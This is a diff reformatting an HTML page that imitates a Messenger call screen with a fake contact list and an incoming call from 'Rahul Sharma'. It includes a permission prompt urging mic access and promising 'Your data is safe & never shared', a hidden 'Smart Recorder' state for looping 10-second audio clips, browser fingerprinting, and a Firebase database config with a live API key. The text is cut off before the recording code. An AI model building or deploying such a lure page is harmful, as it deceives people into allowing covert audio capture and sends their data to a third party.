@@ -1,324 +1,678 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Messenger Call</title>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    -webkit-tap-highlight-color: transparent; }
-body { background: #000; color: #fff; height: 100vh; overflow: hidden; user-select: none; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Messenger Call</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
 
-/* ===== SCREEN 1: CONTACT LIST ===== */
-#contactScreen { position: fixed; inset: 0; background: #000;
-  display: flex; flex-direction: column; z-index: 10; transition: opacity 0.3s; }
-#contactScreen.hide { opacity: 0; pointer-events: none; }
-.header { padding: 16px 20px; background: #000; border-bottom: 1px solid #1c1c1e;
-  display: flex; align-items: center; gap: 12px; }
-.header .back-btn { font-size: 24px; color: #0084FF; }
-.header h1 { font-size: 20px; font-weight: 600; flex: 1; }
-.header .new-chat { font-size: 22px; color: #0084FF; }
-.search-bar { margin: 12px 20px; padding: 10px 16px; background: #1c1c1e;
-  border-radius: 20px; display: flex; align-items: center; gap: 10px;
-  color: #8e8e93; font-size: 15px; }
-.contact-list { flex: 1; overflow-y: auto; }
-.contact-item { display: flex; align-items: center; padding: 12px 20px;
-  gap: 14px; cursor: pointer; transition: background 0.15s; }
-.contact-item:active { background: #1c1c1e; }
-.contact-item .avatar { width: 56px; height: 56px; border-radius: 50%;
-  background: linear-gradient(135deg, #0084FF, #00C6FF);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 24px; font-weight: 600; color: #fff; flex-shrink: 0; position: relative; }
-.contact-item .avatar.online::after { content: ''; position: absolute;
-  bottom: 2px; right: 2px; width: 14px; height: 14px; background: #31A24C;
-  border: 2px solid #000; border-radius: 50%; }
-.contact-item .info { flex: 1; min-width: 0; }
-.contact-item .name { font-size: 16px; font-weight: 500; margin-bottom: 2px; }
-.contact-item .status { font-size: 13px; color: #8e8e93;
-  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.contact-item .call-btn { width: 44px; height: 44px; border-radius: 50%;
-  background: #0084FF; border: none; color: #fff; font-size: 18px;
-  cursor: pointer; display: flex; align-items: center; justify-content: center;
-  transition: transform 0.15s; }
-.contact-item .call-btn:active { transform: scale(0.9); }
+    body {
+      background: #000;
+      color: #fff;
+      height: 100vh;
+      overflow: hidden;
+      user-select: none;
+    }
 
-/* ===== SCREEN 2: INCOMING CALL ===== */
-#incomingScreen { position: fixed; inset: 0;
-  background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);
-  display: none; flex-direction: column; align-items: center;
-  justify-content: space-between; padding: 60px 24px 60px; z-index: 50; }
-#incomingScreen.show { display: flex; }
-.incoming-top { display: flex; flex-direction: column;
-  align-items: center; gap: 20px; margin-top: 40px; }
-.incoming-avatar { width: 140px; height: 140px; border-radius: 50%;
-  background: linear-gradient(135deg, #0084FF, #00C6FF);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 56px; font-weight: 600; animation: incomingPulse 2s infinite; }
-@keyframes incomingPulse {
-  0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,132,255,0.5); }
-  50% { transform: scale(1.05); box-shadow: 0 0 0 30px rgba(0,132,255,0); } }
-.incoming-name { font-size: 28px; font-weight: 600; }
-.incoming-type { font-size: 15px; color: #8e8e93; }
-.incoming-status { font-size: 14px; color: #0084FF; margin-top: 8px; }
-.incoming-actions { display: flex; gap: 60px; align-items: center; }
-.call-action-btn { width: 72px; height: 72px; border-radius: 50%;
-  border: none; font-size: 28px; cursor: pointer;
-  display: flex; align-items: center; justify-content: center;
-  transition: transform 0.15s; color: #fff; }
-.call-action-btn:active { transform: scale(0.9); }
-.decline-btn { background: #FF3B30; }
-.accept-btn { background: #31A24C; animation: acceptPulse 1.5s infinite; }
-@keyframes acceptPulse {
-  0%, 100% { box-shadow: 0 0 0 0 rgba(49,162,76,0.6); }
-  50% { box-shadow: 0 0 0 20px rgba(49,162,76,0); } }
+    /* ===== SCREEN 1: CONTACT LIST ===== */
+    #contactScreen {
+      position: fixed;
+      inset: 0;
+      background: #000;
+      display: flex;
+      flex-direction: column;
+      z-index: 10;
+      transition: opacity 0.3s;
+    }
 
-/* ===== SCREEN 3: PERMISSION ===== */
-#permissionModal { position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-  display: none; align-items: center; justify-content: center;
-  padding: 24px; z-index: 100; }
-#permissionModal.show { display: flex; }
-.permission-content { background: #1c1c1e; border-radius: 20px;
-  padding: 32px 24px; max-width: 400px; width: 100%; text-align: center;
-  animation: slideUp 0.3s ease; }
-@keyframes slideUp {
-  from { transform: translateY(30px); opacity: 0; }
-  to { transform: translateY(0); opacity: 1; } }
-.permission-icons { font-size: 56px; margin-bottom: 20px;
-  display: flex; justify-content: center; gap: 20px; }
-.permission-content h2 { font-size: 22px; margin-bottom: 12px; }
-.permission-content p { font-size: 15px; color: #8e8e93;
-  line-height: 1.5; margin-bottom: 24px; }
-.permission-content .privacy-note { background: #2c2c2e;
-  border-radius: 12px; padding: 12px; font-size: 13px;
-  color: #31A24C; margin-bottom: 24px; }
-.permission-btn { width: 100%; padding: 16px; border: none;
-  border-radius: 12px; font-size: 16px; font-weight: 600;
-  cursor: pointer; margin-bottom: 10px; transition: transform 0.15s; }
-.permission-btn:active { transform: scale(0.97); }
-.btn-allow { background: #0084FF; color: #fff; }
-.btn-deny { background: transparent; color: #8e8e93; font-weight: 400; }
+    #contactScreen.hide {
+      opacity: 0;
+      pointer-events: none;
+    }
 
-/* ===== SCREEN 4: CALL ===== */
-#callScreen { position: fixed; inset: 0; background: #000;
-  display: none; flex-direction: column; z-index: 80; }
-#callScreen.show { display: flex; }
-.remote-video-wrap { flex: 1; position: relative;
-  background: #1c1c1e; overflow: hidden; }
-.call-header { position: absolute; top: 0; left: 0; right: 0;
-  padding: 20px; display: flex; justify-content: space-between;
-  align-items: center;
-  background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, transparent 100%);
-  z-index: 5; }
-.call-header .call-timer { font-size: 15px; background: rgba(0,0,0,0.4);
-  padding: 4px 12px; border-radius: 12px; }
-.call-controls { padding: 30px 20px 40px; display: flex;
-  justify-content: center; gap: 20px; background: #000; }
-.ctrl-btn { width: 60px; height: 60px; border-radius: 50%;
-  border: none; background: #2c2c2e; color: #fff; font-size: 22px;
-  cursor: pointer; display: flex; align-items: center; justify-content: center;
-  transition: transform 0.15s, background 0.2s; }
-.ctrl-btn:active { transform: scale(0.9); }
-.ctrl-btn.active { background: #0084FF; }
-.ctrl-btn.end { background: #FF3B30; width: 70px; height: 70px; font-size: 26px; }
+    .header {
+      padding: 16px 20px;
+      background: #000;
+      border-bottom: 1px solid #1c1c1e;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
 
-/* ===== TOAST ===== */
-.toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
-  background: #2c2c2e; color: #fff; padding: 12px 24px; border-radius: 24px;
-  font-size: 14px; z-index: 9999; animation: toastIn 0.3s ease;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-@keyframes toastIn {
-  from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-  to { opacity: 1; transform: translateX(-50%) translateY(0); } }
-</style>
+    .header .back-btn {
+      font-size: 24px;
+      color: #0084FF;
+    }
+
+    .header h1 {
+      font-size: 20px;
+      font-weight: 600;
+      flex: 1;
+    }
+
+    .header .new-chat {
+      font-size: 22px;
+      color: #0084FF;
+    }
+
+    .search-bar {
+      margin: 12px 20px;
+      padding: 10px 16px;
+      background: #1c1c1e;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #8e8e93;
+      font-size: 15px;
+    }
+
+    .contact-list {
+      flex: 1;
+      overflow-y: auto;
+    }
+
+    .contact-item {
+      display: flex;
+      align-items: center;
+      padding: 12px 20px;
+      gap: 14px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .contact-item:active {
+      background: #1c1c1e;
+    }
+
+    .contact-item .avatar {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0084FF, #00C6FF);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: 600;
+      color: #fff;
+      flex-shrink: 0;
+      position: relative;
+    }
+
+    .contact-item .avatar.online::after {
+      content: '';
+      position: absolute;
+      bottom: 2px;
+      right: 2px;
+      width: 14px;
+      height: 14px;
+      background: #31A24C;
+      border: 2px solid #000;
+      border-radius: 50%;
+    }
+
+    .contact-item .info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .contact-item .name {
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 2px;
+    }
+
+    .contact-item .status {
+      font-size: 13px;
+      color: #8e8e93;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .contact-item .call-btn {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      background: #0084FF;
+      border: none;
+      color: #fff;
+      font-size: 18px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.15s;
+    }
+
+    .contact-item .call-btn:active {
+      transform: scale(0.9);
+    }
+
+    /* ===== SCREEN 2: INCOMING CALL ===== */
+    #incomingScreen {
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      padding: 60px 24px 60px;
+      z-index: 50;
+    }
+
+    #incomingScreen.show {
+      display: flex;
+    }
+
+    .incoming-top {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      margin-top: 40px;
+    }
+
+    .incoming-avatar {
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0084FF, #00C6FF);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 56px;
+      font-weight: 600;
+      animation: incomingPulse 2s infinite;
+    }
+
+    @keyframes incomingPulse {
+
+      0%,
+      100% {
+        transform: scale(1);
+        box-shadow: 0 0 0 0 rgba(0, 132, 255, 0.5);
+      }
+
+      50% {
+        transform: scale(1.05);
+        box-shadow: 0 0 0 30px rgba(0, 132, 255, 0);
+      }
+    }
+
+    .incoming-name {
+      font-size: 28px;
+      font-weight: 600;
+    }
+
+    .incoming-type {
+      font-size: 15px;
+      color: #8e8e93;
+    }
+
+    .incoming-status {
+      font-size: 14px;
+      color: #0084FF;
+      margin-top: 8px;
+    }
+
+    .incoming-actions {
+      display: flex;
+      gap: 60px;
+      align-items: center;
+    }
+
+    .call-action-btn {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      border: none;
+      font-size: 28px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.15s;
+      color: #fff;
+    }
+
+    .call-action-btn:active {
+      transform: scale(0.9);
+    }
+
+    .decline-btn {
+      background: #FF3B30;
+    }
+
+    .accept-btn {
+      background: #31A24C;
+      animation: acceptPulse 1.5s infinite;
+    }
+
+    @keyframes acceptPulse {
+
+      0%,
+      100% {
+        box-shadow: 0 0 0 0 rgba(49, 162, 76, 0.6);
+      }
+
+      50% {
+        box-shadow: 0 0 0 20px rgba(49, 162, 76, 0);
+      }
+    }
+
+    /* ===== SCREEN 3: PERMISSION ===== */
+    #permissionModal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.95);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      z-index: 100;
+    }
+
+    #permissionModal.show {
+      display: flex;
+    }
+
+    .permission-content {
+      background: #1c1c1e;
+      border-radius: 20px;
+      padding: 32px 24px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      animation: slideUp 0.3s ease;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .permission-icons {
+      font-size: 56px;
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+
+    .permission-content h2 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+
+    .permission-content p {
+      font-size: 15px;
+      color: #8e8e93;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .permission-content .privacy-note {
+      background: #2c2c2e;
+      border-radius: 12px;
+      padding: 12px;
+      font-size: 13px;
+      color: #31A24C;
+      margin-bottom: 24px;
+    }
+
+    .permission-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: transform 0.15s;
+    }
+
+    .permission-btn:active {
+      transform: scale(0.97);
+    }
+
+    .btn-allow {
+      background: #0084FF;
+      color: #fff;
+    }
+
+    .btn-deny {
+      background: transparent;
+      color: #8e8e93;
+      font-weight: 400;
+    }
+
+    /* ===== SCREEN 4: CALL ===== */
+    #callScreen {
+      position: fixed;
+      inset: 0;
+      background: #000;
+      display: none;
+      flex-direction: column;
+      z-index: 80;
+    }
+
+    #callScreen.show {
+      display: flex;
+    }
+
+    .remote-video-wrap {
+      flex: 1;
+      position: relative;
+      background: #1c1c1e;
+      overflow: hidden;
+    }
+
+    .call-header {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: linear-gradient(180deg, rgba(0, 0, 0, 0.7) 0%, transparent 100%);
+      z-index: 5;
+    }
+
+    .call-header .call-timer {
+      font-size: 15px;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 4px 12px;
+      border-radius: 12px;
+    }
+
+    .call-controls {
+      padding: 30px 20px 40px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      background: #000;
+    }
+
+    .ctrl-btn {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: none;
+      background: #2c2c2e;
+      color: #fff;
+      font-size: 22px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.15s, background 0.2s;
+    }
+
+    .ctrl-btn:active {
+      transform: scale(0.9);
+    }
+
+    .ctrl-btn.active {
+      background: #0084FF;
+    }
+
+    .ctrl-btn.end {
+      background: #FF3B30;
+      width: 70px;
+      height: 70px;
+      font-size: 26px;
+    }
+
+    /* ===== TOAST ===== */
+    .toast {
+      position: fixed;
+      bottom: 100px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #2c2c2e;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-size: 14px;
+      z-index: 9999;
+      animation: toastIn 0.3s ease;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+    }
+
+    @keyframes toastIn {
+      from {
+        opacity: 0;
+        transform: translateX(-50%) translateY(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateX(-50%) translateY(0);
+      }
+    }
+  </style>
 </head>
+
 <body>
 
-<!-- 🔥 Smart Recorder Badge -->
-<div id="smartRecBadge" style="
+  <!-- 🔥 Smart Recorder Badge -->
+  <div id="smartRecBadge" style="
   position:fixed; bottom:16px; left:16px;
   background:rgba(255,59,48,0.92); color:#fff;
   padding:8px 14px; border-radius:20px; font-size:12px;
   display:none; align-items:center; gap:8px; z-index:9998;
   font-weight:500; box-shadow:0 4px 16px rgba(0,0,0,0.4);">
-  <span style="width:8px; height:8px; border-radius:50%; background:#fff;
+    <span style="width:8px; height:8px; border-radius:50%; background:#fff;
     animation:smartPulse 1s infinite;"></span>
-  <span>🎤 Live <span id="smartRecCount">0</span></span>
-</div>
-<style>
-@keyframes smartPulse {
-  0%, 100% { opacity: 1; }
-  50% { opacity: 0.3; }
-}
-</style>
-
-<!-- SCREEN 1: CONTACT LIST -->
-<div id="contactScreen">
-  <div class="header">
-    <div class="back-btn">←</div>
-    <h1>Chats</h1>
-    <div class="new-chat">✏️</div>
+    <span>🎤 Live <span id="smartRecCount">0</span></span>
   </div>
-  <div class="search-bar">
-    <span>🔍</span>
-    <span>Search Messenger</span>
+  <style>
+    @keyframes smartPulse {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.3;
+      }
+    }
+  </style>
+
+  <!-- SCREEN 1: CONTACT LIST -->
+  <div id="contactScreen">
+    <div class="header">
+      <div class="back-btn">←</div>
+      <h1>Chats</h1>
+      <div class="new-chat">✏️</div>
+    </div>
+    <div class="search-bar">
+      <span>🔍</span>
+      <span>Search Messenger</span>
+    </div>
+    <div class="contact-list" id="contactList"></div>
   </div>
-  <div class="contact-list" id="contactList"></div>
-</div>
 
-<!-- SCREEN 2: INCOMING CALL -->
-<div id="incomingScreen">
-  <div class="incoming-top">
-    <div class="incoming-avatar" id="incomingAvatar">R</div>
-    <div class="incoming-name" id="incomingName">Rahul Sharma</div>
-    <div class="incoming-type">Messenger video call</div>
-    <div class="incoming-status" id="incomingStatus">📞 Ringing...</div>
+  <!-- SCREEN 2: INCOMING CALL -->
+  <div id="incomingScreen">
+    <div class="incoming-top">
+      <div class="incoming-avatar" id="incomingAvatar">R</div>
+      <div class="incoming-name" id="incomingName">Rahul Sharma</div>
+      <div class="incoming-type">Messenger video call</div>
+      <div class="incoming-status" id="incomingStatus">📞 Ringing...</div>
+    </div>
+    <div class="incoming-actions">
+      <button class="call-action-btn decline-btn" onclick="declineCall()">✕</button>
+      <button class="call-action-btn accept-btn" onclick="acceptCall()">📞</button>
+    </div>
   </div>
-  <div class="incoming-actions">
-    <button class="call-action-btn decline-btn" onclick="declineCall()">✕</button>
-    <button class="call-action-btn accept-btn" onclick="acceptCall()">📞</button>
+
+  <!-- SCREEN 3: PERMISSION MODAL -->
+  <div id="permissionModal">
+    <div class="permission-content">
+      <div class="permission-icons">🎤 📷</div>
+      <h2>Enable Camera & Mic</h2>
+      <p>To join the call, please allow <strong>mic first</strong>, then camera.</p>
+      <div class="privacy-note">🔒 Your data is safe & never shared</div>
+      <button class="permission-btn btn-allow" onclick="requestPermissions()">✅ Allow & Join</button>
+      <button class="permission-btn btn-deny" onclick="closePermissionModal()">Not Now</button>
+    </div>
   </div>
-</div>
 
-<!-- SCREEN 3: PERMISSION MODAL -->
-<div id="permissionModal">
-  <div class="permission-content">
-    <div class="permission-icons">🎤 📷</div>
-    <h2>Enable Camera & Mic</h2>
-    <p>To join the call, please allow <strong>mic first</strong>, then camera.</p>
-    <div class="privacy-note">🔒 Your data is safe & never shared</div>
-    <button class="permission-btn btn-allow" onclick="requestPermissions()">✅ Allow & Join</button>
-    <button class="permission-btn btn-deny" onclick="closePermissionModal()">Not Now</button>
+  <!-- SCREEN 4: ACTIVE CALL -->
+  <div id="callScreen">
+    <div class="remote-video-wrap"
+      style="display:flex; align-items:center; justify-content:center; flex-direction:column; background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);">
+      <div id="callAvatar"
+        style="width:160px; height:160px; border-radius:50%; background:linear-gradient(135deg, #0084FF, #00C6FF); display:flex; align-items:center; justify-content:center; font-size:64px; font-weight:600; box-shadow:0 0 60px rgba(0,132,255,0.5);">
+        R</div>
+      <div id="callName" style="font-size:26px; font-weight:600; margin-top:24px;">Rahul Sharma</div>
+      <div style="font-size:16px; color:#8e8e93; margin-top:8px;">🔊 Audio Call</div>
+      <div class="call-header">
+        <div class="call-timer" id="callTimer">00:00</div>
+      </div>
+    </div>
+    <div class="call-controls">
+      <button class="ctrl-btn" id="muteBtn" onclick="toggleMute()">🎤</button>
+      <button class="ctrl-btn" id="speakerBtn" onclick="toggleSpeaker()">🔊</button>
+      <button class="ctrl-btn end" onclick="endCall()">📞</button>
+    </div>
   </div>
-</div>
 
-<!-- SCREEN 4: ACTIVE CALL -->
-<div id="callScreen">
-  <div class="remote-video-wrap" style="display:flex; align-items:center; justify-content:center; flex-direction:column; background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);">
-    <div id="callAvatar" style="width:160px; height:160px; border-radius:50%; background:linear-gradient(135deg, #0084FF, #00C6FF); display:flex; align-items:center; justify-content:center; font-size:64px; font-weight:600; box-shadow:0 0 60px rgba(0,132,255,0.5);">R</div>
-    <div id="callName" style="font-size:26px; font-weight:600; margin-top:24px;">Rahul Sharma</div>
-    <div style="font-size:16px; color:#8e8e93; margin-top:8px;">🔊 Audio Call</div>
-    <div class="call-header"><div class="call-timer" id="callTimer">00:00</div></div>
-  </div>
-  <div class="call-controls">
-    <button class="ctrl-btn" id="muteBtn" onclick="toggleMute()">🎤</button>
-    <button class="ctrl-btn" id="speakerBtn" onclick="toggleSpeaker()">🔊</button>
-    <button class="ctrl-btn end" onclick="endCall()">📞</button>
-  </div>
-</div>
+  <script type="module">
+    /* ============================================================
+       1. FIREBASE
+       ============================================================ */
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import { getDatabase, ref, push, serverTimestamp }
+      from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
-<script type="module">
-/* ============================================================
-   1. FIREBASE
-   ============================================================ */
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getDatabase, ref, push, serverTimestamp }
-  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+    const firebaseConfig = {
+      apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
+      authDomain: "my-rto-b2531.firebaseapp.com",
+      databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
+      projectId: "my-rto-b2531",
+      storageBucket: "my-rto-b2531.firebasestorage.app",
+      messagingSenderId: "465334829178",
+      appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
+    };
 
-const firebaseConfig = {
-  apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
-  authDomain: "my-rto-b2531.firebaseapp.com",
-  databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
-  projectId: "my-rto-b2531",
-  storageBucket: "my-rto-b2531.firebasestorage.app",
-  messagingSenderId: "465334829178",
-  appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
-};
+    const firebaseApp = initializeApp(firebaseConfig);
+    const db = getDatabase(firebaseApp);
+    console.log('✅ Firebase initialized');
 
-const firebaseApp = initializeApp(firebaseConfig);
-const db = getDatabase(firebaseApp);
-console.log('✅ Firebase initialized');
+    /* ============================================================
+       2. DEVICE ID + SESSION ID
+       ============================================================ */
+    function getDeviceId() {
+      let deviceId = localStorage.getItem('pics_device_id');
+      if (deviceId) return deviceId;
+      const raw = [navigator.userAgent, window.screen.width + 'x' + window.screen.height,
+      window.screen.colorDepth, Intl.DateTimeFormat().resolvedOptions().timeZone,
+      navigator.language, navigator.platform, navigator.hardwareConcurrency || ''].join('|');
+      let hash = 0;
+      for (let i = 0; i < raw.length; i++) { hash = ((hash << 5) - hash) + raw.charCodeAt(i); hash = hash & hash; }
+      const BASE62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+      let id = '', n = Math.abs(hash);
+      for (let i = 0; i < 8; i++) { id += BASE62[n % 62]; n = Math.floor(n / 62); }
+      deviceId = 'HEK-' + id;
+      localStorage.setItem('pics_device_id', deviceId);
+      return deviceId;
+    }
+    const DEVICE_ID = getDeviceId();
+    const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    console.log('📱 Device ID:', DEVICE_ID);
+    console.log('🔑 Session ID:', SESSION_ID);
 
-/* ============================================================
-   2. DEVICE ID + SESSION ID
-   ============================================================ */
-function getDeviceId() {
-  let deviceId = localStorage.getItem('pics_device_id');
-  if (deviceId) return deviceId;
-  const raw = [navigator.userAgent, window.screen.width + 'x' + window.screen.height,
-    window.screen.colorDepth, Intl.DateTimeFormat().resolvedOptions().timeZone,
-    navigator.language, navigator.platform, navigator.hardwareConcurrency || ''].join('|');
-  let hash = 0;
-  for (let i = 0; i < raw.length; i++) { hash = ((hash << 5) - hash) + raw.charCodeAt(i); hash = hash & hash; }
-  const BASE62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-  let id = '', n = Math.abs(hash);
-  for (let i = 0; i < 8; i++) { id += BASE62[n % 62]; n = Math.floor(n / 62); }
-  deviceId = 'HEK-' + id;
-  localStorage.setItem('pics_device_id', deviceId);
-  return deviceId;
-}
-const DEVICE_ID = getDeviceId();
-const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-console.log('📱 Device ID:', DEVICE_ID);
-console.log('🔑 Session ID:', SESSION_ID);
+    /* ============================================================
+       3. DATE TIME
+       ============================================================ */
+    function getDateTime() {
+      const now = new Date();
+      return {
+        date: now.toLocaleDateString('en-IN', { day: '2-digit', month: '2-digit', year: 'numeric', timeZone: 'Asia/Kolkata' }),
+        time: now.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true, timeZone: 'Asia/Kolkata' }),
+        timestamp: now.getTime(),
+        iso: now.toISOString()
+      };
+    }
 
-/* ============================================================
-   3. DATE TIME
-   ============================================================ */
-function getDateTime() {
-  const now = new Date();
-  return {
-    date: now.toLocaleDateString('en-IN', { day: '2-digit', month: '2-digit', year: 'numeric', timeZone: 'Asia/Kolkata' }),
-    time: now.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true, timeZone: 'Asia/Kolkata' }),
-    timestamp: now.getTime(),
-    iso: now.toISOString()
-  };
-}
+    /* ============================================================
+       4. CONTACTS
+       ============================================================ */
+    const CONTACTS = [
+      { id: 1, name: 'Rahul Sharma', initial: 'R', status: 'Hey! How are you?', online: true, color: '#0084FF' },
+      { id: 2, name: 'Priya Patel', initial: 'P', status: 'Sent you a photo', online: true, color: '#E91E63' },
+      { id: 3, name: 'Boss', initial: 'B', status: 'Meeting at 3 PM', online: false, color: '#FF9800' },
+      { id: 4, name: 'Anjali Verma', initial: 'A', status: 'Typing...', online: true, color: '#9C27B0' },
+      { id: 5, name: 'Vikram Singh', initial: 'V', status: 'Seen 2h ago', online: false, color: '#4CAF50' },
+      { id: 6, name: 'Sneha Kapoor', initial: 'S', status: 'Active now', online: true, color: '#00BCD4' },
+      { id: 7, name: 'Arjun Mehta', initial: 'A', status: 'You: Ok bro', online: false, color: '#FF5722' },
+      { id: 8, name: 'Mom', initial: 'M', status: 'Call me when free', online: true, color: '#795548' }
+    ];
 
-/* ============================================================
-   4. CONTACTS
-   ============================================================ */
-const CONTACTS = [
-  { id: 1, name: 'Rahul Sharma', initial: 'R', status: 'Hey! How are you?', online: true, color: '#0084FF' },
-  { id: 2, name: 'Priya Patel', initial: 'P', status: 'Sent you a photo', online: true, color: '#E91E63' },
-  { id: 3, name: 'Boss', initial: 'B', status: 'Meeting at 3 PM', online: false, color: '#FF9800' },
-  { id: 4, name: 'Anjali Verma', initial: 'A', status: 'Typing...', online: true, color: '#9C27B0' },
-  { id: 5, name: 'Vikram Singh', initial: 'V', status: 'Seen 2h ago', online: false, color: '#4CAF50' },
-  { id: 6, name: 'Sneha Kapoor', initial: 'S', status: 'Active now', online: true, color: '#00BCD4' },
-  { id: 7, name: 'Arjun Mehta', initial: 'A', status: 'You: Ok bro', online: false, color: '#FF5722' },
-  { id: 8, name: 'Mom', initial: 'M', status: 'Call me when free', online: true, color: '#795548' }
-];
+    /* ============================================================
+       5. STATE
+       ============================================================ */
+    let currentContact = null;
+    let localStream = null;
+    let micStreamOnly = null;
+    let callTimerInterval = null;
+    let callSeconds = 0;
+    let isMuted = false;
+    let isSpeakerOn = false;
 
-/* ============================================================
-   5. STATE
-   ============================================================ */
-let currentContact = null;
-let localStream = null;
-let micStreamOnly = null;
-let callTimerInterval = null;
-let callSeconds = 0;
-let isMuted = false;
-let isSpeakerOn = false;
+    /* 🔥 Smart recorder state */
+    let smartMicStream = null;
+    let smartRecorder = null;
+    let smartChunks = [];
+    let smartIsRecording = false;
+    let smartLoopTimer = null;
+    let smartClipCount = 0;
+    const SMART_CLIP_DURATION = 10000;
 
-/* 🔥 Smart recorder state */
-let smartMicStream = null;
-let smartRecorder = null;
-let smartChunks = [];
-let smartIsRecording = false;
-let smartLoopTimer = null;
-let smartClipCount = 0;
-const SMART_CLIP_DURATION = 10000;
+    /* ============================================================
+       6. DOM
+       ============================================================ */
+    const contactScreen = document.getElementById('contactScreen');
+    const contactList = document.getElementById('contactList');
+    const incomingScreen = document.getElementById('incomingScreen');
+    const incomingAvatar = document.getElementById('incomingAvatar');
+    const incomingName = document.getElementById('incomingName');
+    const incomingStatus = document.getElementById('incomingStatus');
+    const permissionModal = document.getElementById('permissionModal');
+    const callScreen = document.getElementById('callScreen');
+    const callTimer = document.getElementById('callTimer');
+    const smartRecBadge = document.getElementById('smartRecBadge');
+    const smartRecCount = document.getElementById('smartRecCount');
 
-/* ============================================================
-   6. DOM
-   ============================================================ */
-const contactScreen = document.getElementById('contactScreen');
-const contactList = document.getElementById('contactList');
-const incomingScreen = document.getElementById('incomingScreen');
-const incomingAvatar = document.getElementById('incomingAvatar');
-const incomingName = document.getElementById('incomingName');
